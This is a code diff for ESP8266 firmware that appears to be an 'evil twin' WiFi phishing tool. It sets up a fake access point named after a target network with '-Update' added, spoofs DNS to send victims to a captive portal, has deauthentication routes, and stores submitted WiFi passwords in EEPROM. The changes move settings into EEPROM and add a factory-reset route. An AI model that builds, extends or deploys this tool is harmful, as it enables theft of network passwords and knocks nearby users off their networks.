@@ -19,13 +19,12 @@ String webhookUrl = ""; //put your webhook url here if you dont want to re-enter
 #define DNS_PORT 53 //Port for the DNS Server
 const IPAddress APIP(192, 168, 1, 1); //The ip of the esp8266 itself where you can acces the dashboard and index page
 
-#define passStart 34 //Starting location in EEPROM to save password.
-int passEnd = passStart; //Ending location in EEPROM to save password.
+int passEnd = 39; //Ending location in EEPROM to save password.
 String allPass; //Contains all Passwords 
 
 String currentSSID; //Current SSID
 String targetSSID; //ssid of the target network
-String indexLang = "EN"; //Index Page Language(You can change the Default Language Here)
+String indexLang; //Index Page Language(You can change the Default Language Here)
 bool validate = true; //contains if the password should be validated
 int slaveStatus = 8; //contains the wifi status of the slave if reported
 
@@ -101,8 +100,8 @@ void handlePostSSID() {
 
   targetSSID = postedSSID;
   postedSSID += "-Update"; //if you want to change this you have to edit the number of chars that are beeing subtracted in the setup where the target ssid is set
-  for (int i = 0; i < postedSSID.length(); ++i) { EEPROM.write(i+1, postedSSID[i]); } //write ssid to the EEPROM
-  EEPROM.write(postedSSID.length()+1, '\0');
+  for (int i = 0; i < postedSSID.length(); ++i) { EEPROM.write(i+4, postedSSID[i]); } //write ssid to the EEPROM
+  EEPROM.write(postedSSID.length()+4, '\0');
   EEPROM.commit();
 
   redirect("/dashboard");
@@ -117,7 +116,7 @@ void handlePostSSID() {
 
 void clearPass(){ //deletes all stored passwords
   allPass = "";
-  passEnd = passStart; //Setting the password end location -> starting position.
+  passEnd = 39; //Setting the password end location -> starting position.
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
   Serial.printf("All passwords deleted\n\n");
@@ -125,8 +124,10 @@ void clearPass(){ //deletes all stored passwords
 }
 
 void handleLang(){ //change the language for the pages the user will see
-  indexLang = webServer.arg("lang");
-  Serial.printf("Language changed to: %s\n\n", indexLang.c_str());
+  indexLang = webServer.arg("lang"); 
+  for (int i = 2; i < 4; ++i) { EEPROM.write(i, indexLang[i-2]); } EEPROM.commit(); //write ssid to the EEPROM
+
+  Serial.printf("\nLanguage changed to: %s\n\n", indexLang.c_str());
   redirect("/dashboard");
 }
 
@@ -152,7 +153,10 @@ void setValidate(){
   
   if (webServer.arg("validate") == "on"){ validate = true; } else { validate = false; }
 
-  Serial.printf("Validate set to %s\n\n", validate ? "true" : "false");
+  if (validate == true){ EEPROM.write(1, '\1'); } else { EEPROM.write(1, '\0'); }
+  EEPROM.commit();
+
+  Serial.printf("\nValidate set to %s\n\n", validate ? "true" : "false");
 }
 
 void setWebhookUrl(){
@@ -163,37 +167,55 @@ void setWebhookUrl(){
   if(webhookUrl != ""){ Serial.printf("Webhook Url set to %s\n\n", webhookUrl.c_str()); } else { Serial.print("Webhook disabled\n"); }
 }
 
-void setup(){
-  Serial.begin(115200);
+void restoreDefaultSettings(){
+  redirect("/dashboard");
+  EEPROM.write(0, '\0'); //first start byte
+
+  delay(2000); ESP.reset();
+}
+
+void startEEPROM(){
   EEPROM.begin(512);
-  esp.begin(115200);
 
   if (EEPROM.read(0) != '\0') {
-    EEPROM.write(0, '\0');
-    EEPROM.write(1, '\0');
-    EEPROM.write(passStart, '\0');
+    EEPROM.write(0, '\0'); //first start byte
+    EEPROM.write(1, '\1'); //validation setting byte
+    EEPROM.write(2, 'E'); EEPROM.write(3, 'N'); //Set Default Language
+    EEPROM.write(4, '\0'); //essid start
+    EEPROM.write(39, '\0'); //pass start
     EEPROM.commit();
   }
 
   String ESSID;
-  int i = 1;
+  int i = 4;
   while (EEPROM.read(i) != '\0') { ESSID += char(EEPROM.read(i)); i++; } //Read EEPROM SSID
+
+  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : DefaultSSID; //Setting currentSSID -> SSID in EEPROM or default one.
+  targetSSID = currentSSID.substring(0, currentSSID.length() - 7);
 
   //Reading stored password and end location of passwords in the EEPROM.
   while (EEPROM.read(passEnd) != '\0') {
     allPass += char(EEPROM.read(passEnd)); //Reading the store password in EEPROM.
     passEnd++; //Updating the end location of password in EEPROM.
   }
-  
-  Serial.printf("\n\nWiFi mode setup: %s\n", WiFi.mode(WIFI_AP) ? "Sucessfully!" : "Failed!");
-  Serial.printf("Soft ap config: %s\n", WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0)) ? "Sucessfully!" : "Failed!");
 
-  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : DefaultSSID; //Setting currentSSID -> SSID in EEPROM or default one.
-  targetSSID = currentSSID.substring(0, currentSSID.length() - 7);
+  if (EEPROM.read(1) == '\0'){ validate = false; } Serial.printf("\n\nPassword Validation: %s\n", validate ? "True" : "False"); //read validation setting
+
+  for (int i = 2; i < 4; i++){ indexLang += char(EEPROM.read(i)); } Serial.printf("Index Language: %s\n", indexLang.c_str()); //read index Lang
+}
+
+void setup(){
+  Serial.begin(115200);
+  esp.begin(115200);
   
-  Serial.printf("Soft ap setup: %s\n", WiFi.softAP(currentSSID) ? "Sucessfully!" : "Failed!");
+  startEEPROM();
+
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+  
+  WiFi.softAP(currentSSID);
   Serial.printf("AP SSID: %s\n", currentSSID.c_str());
-  Serial.printf("DNS server setup: %s\n\n", dnsServer.start(DNS_PORT, "*", APIP) ? "Sucessfully!" : "Failed!"); //DNS spoofing (Only for HTTP)
+  dnsServer.start(DNS_PORT, "*", APIP); //DNS spoofing (Only for HTTP)
 
   webServer.on("/", [](){  webServer.send(200, "text/html", Index(indexLang, favicon, targetSSID)); });
   webServer.on("/post", handlePost);
@@ -202,6 +224,7 @@ void setup(){
   webServer.on("/clearPass", clearPass);
   webServer.on("/language", handleLang);
   webServer.on("/deauth", handleDeauth);
+  webServer.on("/defaults", restoreDefaultSettings);
   webServer.on("/stop", stopDeauth);
   webServer.on("/incorrectPass", [](){ webServer.send(200, "text/html", wrongPass(indexLang, favicon, targetSSID)); });
   webServer.on("/ssid", handlePostSSID);
